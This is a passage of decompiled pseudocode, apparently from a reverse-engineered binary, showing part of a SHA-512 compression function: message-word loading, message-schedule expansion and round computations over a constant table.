  v161 = (v35 + __PAIR64__(v160, v144)) >> 32;
  v145 = v142
       + HIDWORD(v120)
       + (v219 & v217 ^ (v30 + v21) & ~v219)
       + ((__PAIR64__(v154, v219) >> 14) ^ (__PAIR64__(v154, v219) >> 18) ^ ((v219 << 23) | (v154 >> 9)))
       - 226784913
       + v144;
  v36 = v35
      + __PAIR64__(v210 & v172 ^ HIDWORD(v133) & (v210 ^ v172), v194 & v163 ^ v133 & (v194 ^ v163))
      + __PAIR64__(
          (__PAIR64__(v210, v194) >> 7) ^ (__PAIR64__(v210, v194) >> 2) ^ ((v210 >> 28) | (16 * v194)),
          (((_DWORD)v194 << 25) | (v210 >> 7)) ^ (((_DWORD)v194 << 30) | (v210 >> 2)) ^ (__PAIR64__(v210, v194) >> 28));
  v199 = HIDWORD(v36);
  v180 = v36;
  HIDWORD(v3) = (unsigned __int64)a2[104] >> 24;
  LODWORD(v3) = a2[105] | (a2[104] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[106] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[107] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[108] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[109] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[110] | ((_DWORD)v3 << 8);
  LODWORD(v127) = v3 >> 24;
  HIDWORD(v127) = a2[111] | ((_DWORD)v3 << 8);
  v37 = v30
      + v21
      + ((v3 << 8) | a2[111])
      + __PAIR64__(v154 & v161 ^ v150 & ~v161, v219 & v145 ^ (v31 + v24) & ~v145)
      + __PAIR64__(
          ((v161 >> 14) | (v145 << 18)) ^ ((v161 >> 18) | (v145 << 14)) ^ (__PAIR64__(v161, v145) >> 9),
          (__PAIR64__(v161, v145) >> 14) ^ (__PAIR64__(v161, v145) >> 18) ^ ((v145 << 23) | (v161 >> 9)))
      - 0x7F214E01C4E9694Fi64;
  v134 = v37 + v133;
  v38 = v37
      + __PAIR64__(v199 & v210 ^ v172 & (v199 ^ v210), v180 & v194 ^ v163 & (v180 ^ v194))
      + __PAIR64__(
          (__PAIR64__(v199, v180) >> 7) ^ (__PAIR64__(v199, v180) >> 2) ^ ((v199 >> 28) | (16 * v180)),
          ((v180 << 25) | (v199 >> 7)) ^ ((v180 << 30) | (v199 >> 2)) ^ (__PAIR64__(v199, v180) >> 28));
  v204 = HIDWORD(v38);
  v189 = v38;
  HIDWORD(v3) = (unsigned __int64)a2[112] >> 24;
  LODWORD(v3) = a2[113] | (a2[112] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[114] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[115] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[116] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[117] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[118] | ((_DWORD)v3 << 8);
  LODWORD(v126) = v3 >> 24;
  HIDWORD(v126) = a2[119] | ((_DWORD)v3 << 8);
  v39 = v31
      + v24
      + ((v3 << 8) | a2[119])
      + __PAIR64__(HIDWORD(v134) & v161 ^ v154 & ~HIDWORD(v134), v134 & v145 ^ v219 & ~(_DWORD)v134)
      + __PAIR64__(
          ((HIDWORD(v134) >> 14) | ((_DWORD)v134 << 18)) ^ ((HIDWORD(v134) >> 18) | ((_DWORD)v134 << 14)) ^ (v134 >> 9),
          (v134 >> 14) ^ (v134 >> 18) ^ (((_DWORD)v134 << 23) | (HIDWORD(v134) >> 9)))
      - 0x6423F958DA38EDCBi64;
  v173 = (v39 + __PAIR64__(v172, v163)) >> 32;
  v164 = v31
       + v24
       + HIDWORD(v126)
       + (v134 & v145 ^ v219 & ~(_DWORD)v134)
       + ((v134 >> 14) ^ (v134 >> 18) ^ (((_DWORD)v134 << 23) | (HIDWORD(v134) >> 9)))
       + 633803317
       + v163;
  v40 = v39
      + __PAIR64__(v204 & v199 ^ v210 & (v204 ^ v199), v189 & v180 ^ v194 & (v189 ^ v180))
      + __PAIR64__(
          (__PAIR64__(v204, v189) >> 7) ^ (__PAIR64__(v204, v189) >> 2) ^ ((v204 >> 28) | (16 * v189)),
          ((v189 << 25) | (v204 >> 7)) ^ ((v189 << 30) | (v204 >> 2)) ^ (__PAIR64__(v204, v189) >> 28));
  LODWORD(v182) = HIDWORD(v40);
  HIDWORD(v182) = v40;
  HIDWORD(v3) = (unsigned __int64)a2[120] >> 24;
  LODWORD(v3) = a2[121] | (a2[120] << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[122] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[123] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[124] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[125] | ((_DWORD)v3 << 8);
  HIDWORD(v3) = v3 >> 24;
  LODWORD(v3) = a2[126] | ((_DWORD)v3 << 8);
  LODWORD(v131) = v3 >> 24;
  HIDWORD(v131) = a2[127] | ((_DWORD)v3 << 8);
  v41 = __PAIR64__(v154, v219)
      + ((v3 << 8) | a2[127])
      + __PAIR64__(v173 & HIDWORD(v134) ^ v161 & ~v173, v164 & v134 ^ v145 & ~v164)
      + __PAIR64__(
          ((v173 >> 14) | (v164 << 18)) ^ ((v173 >> 18) | (v164 << 14)) ^ (__PAIR64__(v173, v164) >> 9),
          (__PAIR64__(v173, v164) >> 14) ^ (__PAIR64__(v173, v164) >> 18) ^ ((v164 << 23) | (v173 >> 9)))
      - 0x3E640E8B3096D96Ci64;
  v211 = (v41 + __PAIR64__(v210, v194)) >> 32;
  v195 = v41 + v194;
  v221 = v41
       + (HIDWORD(v182) & v189 ^ v180 & (HIDWORD(v182) ^ v189))
       + ((v182 >> 7) ^ (v182 >> 2) ^ (__PAIR64__(v182, HIDWORD(v182)) >> 28));
  v170 = (v41
        + __PAIR64__(v182 & v204 ^ v199 & (v182 ^ v204), HIDWORD(v182) & v189 ^ v180 & (HIDWORD(v182) ^ v189))
        + __PAIR64__(
            (__PAIR64__(v182, HIDWORD(v182)) >> 7) ^ (__PAIR64__(v182, HIDWORD(v182)) >> 2) ^ (v182 >> 28),
            (v182 >> 7) ^ (v182 >> 2) ^ (__PAIR64__(v182, HIDWORD(v182)) >> 28))) >> 32;
  v42 = &unk_408770;
  do
  {
    v43 = (__PAIR64__(v112, v123)
         + __PAIR64__(
             ((unsigned int)v117 >> 7) ^ (v117 >> 1) ^ (v117 >> 8),
             (__PAIR64__(v117, HIDWORD(v117)) >> 7) ^ (__PAIR64__(v117, HIDWORD(v117)) >> 1) ^ (__PAIR64__(
                                                                                                  v117,
                                                                                                  HIDWORD(v117)) >> 8))
         + __PAIR64__(
             ((unsigned int)v126 >> 6) ^ (__PAIR64__(v126, HIDWORD(v126)) >> 29) ^ (v126 >> 19),
             (__PAIR64__(v126, HIDWORD(v126)) >> 6) ^ (v126 >> 29) ^ (__PAIR64__(v126, HIDWORD(v126)) >> 19))
         + __PAIR64__(v115, HIDWORD(v115))) >> 32;
    HIDWORD(v115) += v123
                   + ((__PAIR64__(v117, HIDWORD(v117)) >> 7) ^ (__PAIR64__(v117, HIDWORD(v117)) >> 1) ^ (__PAIR64__(v117, HIDWORD(v117)) >> 8))
                   + ((__PAIR64__(v126, HIDWORD(v126)) >> 6) ^ (v126 >> 29) ^ (__PAIR64__(v126, HIDWORD(v126)) >> 19));
    LODWORD(v115) = v43;
    v44 = __PAIR64__(v161, v145)
        + __PAIR64__(v43, HIDWORD(v115))
        + *(v42 - 1)
        + __PAIR64__(
            ((v211 >> 14) | (v195 << 18)) ^ ((v211 >> 18) | (v195 << 14)) ^ (__PAIR64__(v211, v195) >> 9),
            v195 & v164 ^ v134 & ~v195)
        + __PAIR64__(
            v211 & v173 ^ HIDWORD(v134) & ~v211,
            (__PAIR64__(v211, v195) >> 14) ^ (__PAIR64__(v211, v195) >> 18) ^ ((v195 << 23) | (v211 >> 9)));
    v45 = v44 + __PAIR64__(v199, v180);
    v200 = (v44 + __PAIR64__(v199, v180)) >> 32;
    v181 = v45;
    v155 = ((v221 << 25) | (v170 >> 7)) ^ ((v221 << 30) | (v170 >> 2)) ^ (__PAIR64__(v170, v221) >> 28);
    v46 = v221 & HIDWORD(v182) ^ v189 & (v221 ^ HIDWORD(v182));
    v47 = v44
        + __PAIR64__((__PAIR64__(v170, v221) >> 7) ^ (__PAIR64__(v170, v221) >> 2) ^ ((v170 >> 28) | (16 * v221)), v46)
        + __PAIR64__(v170 & v182 ^ v204 & (v170 ^ v182), v155);
    v156 = v44 + v46 + v155;
    v48 = (__PAIR64__(v125, HIDWORD(v125))
         + __PAIR64__(
             (v114 >> 7) ^ ((v114 >> 1) | (v116 << 31)) ^ ((v114 >> 8) | (v116 << 24)),
             (__PAIR64__(v114, v116) >> 7) ^ (__PAIR64__(v114, v116) >> 1) ^ (__PAIR64__(v114, v116) >> 8))
         + __PAIR64__(
             ((unsigned int)v131 >> 6) ^ (__PAIR64__(v131, HIDWORD(v131)) >> 29) ^ (v131 >> 19),
             (__PAIR64__(v131, HIDWORD(v131)) >> 6) ^ (v131 >> 29) ^ (__PAIR64__(v131, HIDWORD(v131)) >> 19))
         + __PAIR64__(v117, HIDWORD(v117))) >> 32;
    HIDWORD(v117) += HIDWORD(v125)
                   + ((__PAIR64__(v114, v116) >> 7) ^ (__PAIR64__(v114, v116) >> 1) ^ (__PAIR64__(v114, v116) >> 8))
                   + ((__PAIR64__(v131, HIDWORD(v131)) >> 6) ^ (v131 >> 29) ^ (__PAIR64__(v131, HIDWORD(v131)) >> 19));
    LODWORD(v117) = v48;
    HIDWORD(v49) = ((v200 >> 14) | (v181 << 18)) ^ ((v200 >> 18) | (v181 << 14)) ^ (__PAIR64__(v200, v181) >> 9);
    HIDWORD(v50) = v200 & v211 ^ v173 & ~v200;
    LODWORD(v49) = (__PAIR64__(v200, v181) >> 14) ^ (__PAIR64__(v200, v181) >> 18) ^ ((v181 << 23) | (v200 >> 9));
    LODWORD(v50) = v181 & v195 ^ v164 & ~v181;
    v51 = v134 + __PAIR64__(v48, HIDWORD(v117)) + *v42 + v50 + v49;
    v52 = v51 + __PAIR64__(v204, v189);
    v205 = HIDWORD(v52);
    v190 = v52;
    v138 = v51
         + __PAIR64__(
             (__PAIR64__(HIDWORD(v47), v156) >> 7) ^ (__PAIR64__(HIDWORD(v47), v156) >> 2) ^ ((HIDWORD(v47) >> 28) | (16 * v156)),
             v221 & HIDWORD(v182) ^ v156 & (v221 ^ HIDWORD(v182)))
         + __PAIR64__(
             v170 & v182 ^ HIDWORD(v47) & (v170 ^ v182),
             ((v156 << 25) | (HIDWORD(v47) >> 7)) ^ ((v156 << 30) | (HIDWORD(v47) >> 2)) ^ (__PAIR64__(
                                                                                              HIDWORD(v47),
                                                                                              v156) >> 28));
    v53 = __PAIR64__(v122, v118)
        + __PAIR64__(
            ((unsigned int)v113 >> 7) ^ (v113 >> 1) ^ (v113 >> 8),
            (__PAIR64__(v113, HIDWORD(v113)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v113, HIDWORD(v113))) >> 32) ^ (__PAIR64__(v113, HIDWORD(v113)) >> 8))
        + __PAIR64__(
            ((unsigned int)v115 >> 6) ^ (__PAIR64__(v115, HIDWORD(v115)) >> 29) ^ (v115 >> 19),
            (__PAIR64__(v115, HIDWORD(v115)) >> 6) ^ (v115 >> 29) ^ (__PAIR64__(v115, HIDWORD(v115)) >> 19))
        + __PAIR64__(v114, v116);
    v114 = HIDWORD(v53);
    v116 = v53;
    HIDWORD(v49) = ((v205 >> 14) | (v190 << 18)) ^ ((v205 >> 18) | (v190 << 14)) ^ (__PAIR64__(v205, v190) >> 9);
    HIDWORD(v50) = v205 & v200 ^ v211 & ~v205;
    LODWORD(v49) = (__PAIR64__(v205, v190) >> 14) ^ (__PAIR64__(v205, v190) >> 18) ^ ((v190 << 23) | (v205 >> 9));
    LODWORD(v50) = v190 & v45 ^ v195 & ~v190;
    v54 = __PAIR64__(v173, v164) + __PAIR64__(v114, v116) + v42[1] + v50 + v49;
    v55 = v54 + __PAIR64__(v182, HIDWORD(v182));
    LODWORD(v183) = HIDWORD(v55);
    HIDWORD(v183) = v55;
    LODWORD(v50) = v221 & v138 ^ v156 & (v221 ^ v138);
    HIDWORD(v50) = v170 & HIDWORD(v138) ^ HIDWORD(v47) & (v170 ^ HIDWORD(v138));
    v56 = v50
        + __PAIR64__(
            (v138 >> 7) ^ (v138 >> 2) ^ ((HIDWORD(v138) >> 28) | (16 * v138)),
            (((_DWORD)v138 << 25) | (HIDWORD(v138) >> 7)) ^ (((_DWORD)v138 << 30) | (HIDWORD(v138) >> 2)) ^ (v138 >> 28));
    v165 = v54
         + v50
         + ((((_DWORD)v138 << 25) | (HIDWORD(v138) >> 7)) ^ (((_DWORD)v138 << 30) | (HIDWORD(v138) >> 2)) ^ (v138 >> 28));
    v174 = (v54
          + v50
          + __PAIR64__(
              (v138 >> 7) ^ (v138 >> 2) ^ ((HIDWORD(v138) >> 28) | (16 * v138)),
              (((_DWORD)v138 << 25) | (HIDWORD(v138) >> 7)) ^ (((_DWORD)v138 << 30) | (HIDWORD(v138) >> 2)) ^ (v138 >> 28))) >> 32;
    v57 = __PAIR64__(v120, HIDWORD(v120))
        + __PAIR64__(
            ((unsigned int)v111 >> 7) ^ (v111 >> 1) ^ (v111 >> 8),
            (__PAIR64__(v111, HIDWORD(v111)) >> 7) ^ (__PAIR64__(v111, HIDWORD(v111)) >> 1) ^ (__PAIR64__(
                                                                                                 v111,
                                                                                                 HIDWORD(v111)) >> 8))
        + __PAIR64__(
            ((unsigned int)v117 >> 6) ^ (__PAIR64__(v117, HIDWORD(v117)) >> 29) ^ (v117 >> 19),
            (__PAIR64__(v117, HIDWORD(v117)) >> 6) ^ (v117 >> 29) ^ (__PAIR64__(v117, HIDWORD(v117)) >> 19))
        + __PAIR64__(v113, HIDWORD(v113));
    LODWORD(v113) = HIDWORD(v57);
    HIDWORD(v113) = v57;
    HIDWORD(v49) = (v183 >> 14) ^ (v183 >> 18) ^ (__PAIR64__(v183, HIDWORD(v183)) >> 9);
    HIDWORD(v50) = v183 & v205 ^ v200 & ~(_DWORD)v183;
    LODWORD(v49) = (__PAIR64__(v183, HIDWORD(v183)) >> 14) ^ (__PAIR64__(v183, HIDWORD(v183)) >> 18) ^ (v183 >> 9);
    LODWORD(v50) = HIDWORD(v183) & v190 ^ v45 & ~HIDWORD(v183);
    v58 = __PAIR64__(v211, v195) + __PAIR64__(v113, HIDWORD(v113)) + v42[2] + v50 + v49;
    v171 = (v58 + __PAIR64__(v170, v221)) >> 32;
    v222 = v58 + v221;
    v59 = v222;
    LODWORD(v50) = v165 & v138 ^ v156 & (v165 ^ v138);
    HIDWORD(v50) = v174 & HIDWORD(v138) ^ HIDWORD(v47) & (v174 ^ HIDWORD(v138));
    v212 = (v58
          + v50
          + __PAIR64__(
              ((v54 + v56) >> 7) ^ ((v54 + v56) >> 2) ^ ((v174 >> 28) | (16 * v165)),
              ((v165 << 25) | (v174 >> 7)) ^ ((v165 << 30) | (v174 >> 2)) ^ ((v54 + v56) >> 28))) >> 32;
    v196 = v58 + v50 + (((v165 << 25) | (v174 >> 7)) ^ ((v165 << 30) | (v174 >> 2)) ^ ((v54 + v56) >> 28));
    v60 = __PAIR64__(v127, HIDWORD(v127))
        + __PAIR64__(
            (v114 >> 6) ^ (__PAIR64__(v114, v116) >> 29) ^ ((v114 >> 19) | (v116 << 13)),
            (__PAIR64__(v114, v116) >> 6) ^ ((8 * v116) | (v114 >> 29)) ^ (__PAIR64__(v114, v116) >> 19))
        + __PAIR64__(
            ((unsigned int)v124 >> 7) ^ (v124 >> 1) ^ (v124 >> 8),
            (__PAIR64__(v124, HIDWORD(v124)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v124, HIDWORD(v124))) >> 32) ^ (__PAIR64__(v124, HIDWORD(v124)) >> 8))
        + __PAIR64__(v111, HIDWORD(v111));
    LODWORD(v111) = HIDWORD(v60);
    HIDWORD(v111) = v60;
    HIDWORD(v58) = ((v171 >> 14) | (v59 << 18)) ^ ((v171 >> 18) | (v59 << 14)) ^ (__PAIR64__(v171, v59) >> 9);
    LODWORD(v50) = v59 & HIDWORD(v183) ^ v190 & ~v59;
    HIDWORD(v50) = v171 & v183 ^ v205 & ~v171;
    LODWORD(v58) = (__PAIR64__(v171, v59) >> 14) ^ (__PAIR64__(v171, v59) >> 18) ^ ((v59 << 23) | (v171 >> 9));
    v61 = __PAIR64__(v200, v45) + __PAIR64__(v111, HIDWORD(v111)) + v42[3] + v50 + v58;
    v62 = v61 + __PAIR64__(HIDWORD(v47), v156);
    v218 = HIDWORD(v62);
    v157 = v62;
    LODWORD(v50) = v196 & v165 ^ v138 & (v196 ^ v165);
    HIDWORD(v50) = v212 & v174 ^ HIDWORD(v138) & (v212 ^ v174);
    v63 = v50
        + __PAIR64__(
            (__PAIR64__(v212, v196) >> 7) ^ (__PAIR64__(v212, v196) >> 2) ^ ((v212 >> 28) | (16 * v196)),
            ((v196 << 25) | (v212 >> 7)) ^ ((v196 << 30) | (v212 >> 2)) ^ (__PAIR64__(v212, v196) >> 28));
    v151 = v61 + v50 + (((v196 << 25) | (v212 >> 7)) ^ ((v196 << 30) | (v212 >> 2)) ^ (__PAIR64__(v212, v196) >> 28));
    v201 = (v61
          + v50
          + __PAIR64__(
              (__PAIR64__(v212, v196) >> 7) ^ (__PAIR64__(v212, v196) >> 2) ^ ((v212 >> 28) | (16 * v196)),
              ((v196 << 25) | (v212 >> 7)) ^ ((v196 << 30) | (v212 >> 2)) ^ (__PAIR64__(v212, v196) >> 28))) >> 32;
    v64 = __PAIR64__(v126, HIDWORD(v126))
        + __PAIR64__(
            ((unsigned int)v113 >> 6) ^ (__PAIR64__(v113, HIDWORD(v113)) >> 29) ^ (v113 >> 19),
            (__PAIR64__(v113, HIDWORD(v113)) >> 6) ^ (v113 >> 29) ^ (__PAIR64__(v113, HIDWORD(v113)) >> 19))
        + __PAIR64__(
            ((unsigned int)v121 >> 7) ^ (v121 >> 1) ^ (v121 >> 8),
            (__PAIR64__(v121, HIDWORD(v121)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v121, HIDWORD(v121))) >> 32) ^ (__PAIR64__(v121, HIDWORD(v121)) >> 8))
        + __PAIR64__(v124, HIDWORD(v124));
    LODWORD(v124) = HIDWORD(v64);
    HIDWORD(v124) = v64;
    HIDWORD(v58) = ((v218 >> 14) | (v157 << 18)) ^ ((v218 >> 18) | (v157 << 14)) ^ (__PAIR64__(v218, v157) >> 9);
    HIDWORD(v50) = v171 & v218 ^ v183 & ~v218;
    LODWORD(v50) = v222 & v157 ^ HIDWORD(v183) & ~v157;
    LODWORD(v58) = (__PAIR64__(v218, v157) >> 14) ^ (__PAIR64__(v218, v157) >> 18) ^ ((v157 << 23) | (v218 >> 9));
    v65 = __PAIR64__(v205, v190) + __PAIR64__(v124, HIDWORD(v124)) + v42[4] + v50 + v58;
    v139 = v65 + v138;
    LODWORD(v50) = v151 & v196 ^ v165 & (v151 ^ v196);
    HIDWORD(v50) = v201 & v212 ^ v174 & (v201 ^ v212);
    v66 = v65
        + v50
        + __PAIR64__(
            ((v61 + v63) >> 7) ^ ((v61 + v63) >> 2) ^ ((v201 >> 28) | (16 * v151)),
            ((v151 << 25) | (v201 >> 7)) ^ ((v151 << 30) | (v201 >> 2)) ^ ((v61 + v63) >> 28));
    v191 = v65 + v50 + (((v151 << 25) | (v201 >> 7)) ^ ((v151 << 30) | (v201 >> 2)) ^ ((v61 + v63) >> 28));
    v206 = HIDWORD(v66);
    v67 = __PAIR64__(v131, HIDWORD(v131))
        + __PAIR64__(
            ((unsigned int)v111 >> 6) ^ (__PAIR64__(v111, HIDWORD(v111)) >> 29) ^ (v111 >> 19),
            (__PAIR64__(v111, HIDWORD(v111)) >> 6) ^ (v111 >> 29) ^ (__PAIR64__(v111, HIDWORD(v111)) >> 19))
        + __PAIR64__(
            ((unsigned int)v119 >> 7) ^ (v119 >> 1) ^ (v119 >> 8),
            (__PAIR64__(v119, HIDWORD(v119)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v119, HIDWORD(v119))) >> 32) ^ (__PAIR64__(v119, HIDWORD(v119)) >> 8))
        + __PAIR64__(v121, HIDWORD(v121));
    LODWORD(v121) = HIDWORD(v67);
    HIDWORD(v121) = v67;
    HIDWORD(v58) = ((HIDWORD(v139) >> 14) | ((_DWORD)v139 << 18)) ^ ((HIDWORD(v139) >> 18) | ((_DWORD)v139 << 14)) ^ (v139 >> 9);
    HIDWORD(v50) = HIDWORD(v139) & v218 ^ v171 & ~HIDWORD(v139);
    LODWORD(v58) = (v139 >> 14) ^ (v139 >> 18) ^ (((_DWORD)v139 << 23) | (HIDWORD(v139) >> 9));
    LODWORD(v50) = v139 & v157 ^ v222 & ~(_DWORD)v139;
    v68 = __PAIR64__(v183, HIDWORD(v183)) + __PAIR64__(v121, HIDWORD(v121)) + v42[5] + v50 + v58;
    v69 = v68 + v54 + v56;
    v175 = HIDWORD(v69);
    v166 = v69;
    LODWORD(v50) = v191 & v151 ^ v196 & (v191 ^ v151);
    HIDWORD(v50) = v206 & v201 ^ v212 & (v206 ^ v201);
    v70 = v68
        + v50
        + __PAIR64__(
            (__PAIR64__(v206, v191) >> 7) ^ (__PAIR64__(v206, v191) >> 2) ^ ((v206 >> 28) | (16 * v191)),
            ((v191 << 25) | (v206 >> 7)) ^ ((v191 << 30) | (v206 >> 2)) ^ (__PAIR64__(v206, v191) >> 28));
    LODWORD(v119) = (__PAIR64__(v115, HIDWORD(v115))
                   + __PAIR64__(
                       ((unsigned int)v124 >> 6) ^ (__PAIR64__(v124, HIDWORD(v124)) >> 29) ^ (v124 >> 19),
                       (__PAIR64__(v124, HIDWORD(v124)) >> 6) ^ (v124 >> 29) ^ (__PAIR64__(v124, HIDWORD(v124)) >> 19))
                   + __PAIR64__(
                       (HIDWORD(v129) >> 7) ^ ((HIDWORD(v129) >> 1) | ((_DWORD)v129 << 31)) ^ ((HIDWORD(v129) >> 8) | ((_DWORD)v129 << 24)),
                       (v129 >> 7) ^ ((0xFFFFFFFF80000000ui64 * v129) >> 32) ^ (v129 >> 8))
                   + __PAIR64__(v119, HIDWORD(v119))) >> 32;
    HIDWORD(v119) += HIDWORD(v115)
                   + ((__PAIR64__(v124, HIDWORD(v124)) >> 6) ^ (v124 >> 29) ^ (__PAIR64__(v124, HIDWORD(v124)) >> 19))
                   + ((v129 >> 7) ^ ((0xFFFFFFFF80000000ui64 * v129) >> 32) ^ (v129 >> 8));
    HIDWORD(v58) = ((v175 >> 14) | (v166 << 18)) ^ ((v175 >> 18) | (v166 << 14)) ^ (__PAIR64__(v175, v166) >> 9);
    HIDWORD(v50) = v175 & HIDWORD(v139) ^ v218 & ~v175;
    LODWORD(v58) = (__PAIR64__(v175, v166) >> 14) ^ (__PAIR64__(v175, v166) >> 18) ^ ((v166 << 23) | (v175 >> 9));
    LODWORD(v50) = v166 & v139 ^ v157 & ~v166;
    v71 = __PAIR64__(v171, v222) + __PAIR64__(v119, HIDWORD(v119)) + v42[6] + v50 + v58;
    v72 = v71 + __PAIR64__(v212, v196);
    v213 = HIDWORD(v72);
    v197 = v72;
    LODWORD(v50) = v70 & v191 ^ v151 & (v70 ^ v191);
    HIDWORD(v50) = HIDWORD(v70) & v206 ^ v201 & (HIDWORD(v70) ^ v206);
    v73 = v71
        + v50
        + __PAIR64__(
            (v70 >> 7) ^ (v70 >> 2) ^ (__SPAIR64__(v70, HIDWORD(v70)) >> 28),
            (__SPAIR64__(v70, HIDWORD(v70)) >> 7) ^ (__SPAIR64__(v70, HIDWORD(v70)) >> 2) ^ (v70 >> 28));
    v129 += __PAIR64__(v48, HIDWORD(v117))
          + __PAIR64__(
              ((unsigned int)v121 >> 6) ^ (__PAIR64__(v121, HIDWORD(v121)) >> 29) ^ (v121 >> 19),
              (__PAIR64__(v121, HIDWORD(v121)) >> 6) ^ (v121 >> 29) ^ (__PAIR64__(v121, HIDWORD(v121)) >> 19))
          + __PAIR64__(
              (v112 >> 7) ^ ((v112 >> 1) | (v123 << 31)) ^ ((v112 >> 8) | (v123 << 24)),
              (__PAIR64__(v112, v123) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v112, v123)) >> 32) ^ (__PAIR64__(v112, v123) >> 8));
    v202 = (__PAIR64__(v218, v157)
          + v129
          + v42[7]
          + __PAIR64__(
              ((v213 >> 14) | (v197 << 18)) ^ ((v213 >> 18) | (v197 << 14)) ^ (__PAIR64__(v213, v197) >> 9),
              v197 & v166 ^ v139 & ~v197)
          + __PAIR64__(
              v213 & v175 ^ HIDWORD(v139) & ~v213,
              (__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9)))
          + v61
          + v63) >> 32;
    v152 = v157
         + v129
         + *((_DWORD *)v42 + 14)
         + (v197 & v166 ^ v139 & ~v197)
         + ((__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9)))
         + v61
         + v63;
    v162 = (__PAIR64__(v218, v157)
          + v129
          + v42[7]
          + __PAIR64__(
              ((v213 >> 14) | (v197 << 18)) ^ ((v213 >> 18) | (v197 << 14)) ^ (__PAIR64__(v213, v197) >> 9),
              v197 & v166 ^ v139 & ~v197)
          + __PAIR64__(
              v213 & v175 ^ HIDWORD(v139) & ~v213,
              (__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9)))
          + (v73 & v70 ^ v66 & (v73 ^ v70))
          + __PAIR64__(
              (v73 >> 7) ^ (v73 >> 2) ^ ((HIDWORD(v73) >> 28) | (16 * v73)),
              (((_DWORD)v73 << 25) | (HIDWORD(v73) >> 7)) ^ (((_DWORD)v73 << 30) | (HIDWORD(v73) >> 2)) ^ (v73 >> 28))) >> 32;
    v146 = v157
         + v129
         + *((_DWORD *)v42 + 14)
         + (v197 & v166 ^ v139 & ~v197)
         + ((__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9)))
         + (v73 & v70 ^ v66 & (v73 ^ v70))
         + ((((_DWORD)v73 << 25) | (HIDWORD(v73) >> 7)) ^ (((_DWORD)v73 << 30) | (HIDWORD(v73) >> 2)) ^ (v73 >> 28));
    v74 = __PAIR64__(v114, v116)
        + __PAIR64__(
            ((unsigned int)v119 >> 6) ^ (__PAIR64__(v119, HIDWORD(v119)) >> 29) ^ (v119 >> 19),
            (__PAIR64__(v119, HIDWORD(v119)) >> 6) ^ (v119 >> 29) ^ (__PAIR64__(v119, HIDWORD(v119)) >> 19))
        + __PAIR64__(
            ((unsigned int)v125 >> 7) ^ (v125 >> 1) ^ (v125 >> 8),
            (__PAIR64__(v125, HIDWORD(v125)) >> 7) ^ ((0xFFFFFFFF80000000ui64 * __PAIR64__(v125, HIDWORD(v125))) >> 32) ^ (__PAIR64__(v125, HIDWORD(v125)) >> 8))
        + __PAIR64__(v112, v123);
    v112 = HIDWORD(v74);
    v123 = v74;
    HIDWORD(v58) = ((v202 >> 14) | (v152 << 18)) ^ ((v202 >> 18) | (v152 << 14)) ^ ((__PAIR64__(v218, v157)
                                                                                   + v129
                                                                                   + v42[7]
                                                                                   + __PAIR64__(
                                                                                       ((v213 >> 14) | (v197 << 18)) ^ ((v213 >> 18) | (v197 << 14)) ^ (__PAIR64__(v213, v197) >> 9),
                                                                                       v197 & v166 ^ v139 & ~v197)
                                                                                   + __PAIR64__(
                                                                                       v213 & v175 ^ HIDWORD(v139) & ~v213,
                                                                                       (__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9)))
                                                                                   + v61
                                                                                   + v63) >> 9);
    HIDWORD(v50) = v202 & v213 ^ v175 & ~v202;
    LODWORD(v58) = ((__PAIR64__(v218, v157)
                   + v129
                   + v42[7]
                   + __PAIR64__(
                       ((v213 >> 14) | (v197 << 18)) ^ ((v213 >> 18) | (v197 << 14)) ^ (__PAIR64__(v213, v197) >> 9),
                       v197 & v166 ^ v139 & ~v197)
                   + __PAIR64__(
                       v213 & v175 ^ HIDWORD(v139) & ~v213,
                       (__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9)))
                   + v61
                   + v63) >> 14) ^ ((__PAIR64__(v218, v157)
                                   + v129
                                   + v42[7]
                                   + __PAIR64__(
                                       ((v213 >> 14) | (v197 << 18)) ^ ((v213 >> 18) | (v197 << 14)) ^ (__PAIR64__(v213, v197) >> 9),
                                       v197 & v166 ^ v139 & ~v197)
                                   + __PAIR64__(
                                       v213 & v175 ^ HIDWORD(v139) & ~v213,
                                       (__PAIR64__(v213, v197) >> 14) ^ (__PAIR64__(v213, v197) >> 18) ^ ((v197 << 23) | (v213 >> 9)))
                                   + v61
                                   + v63) >> 18) ^ ((v152 << 23) | (v202 >> 9));
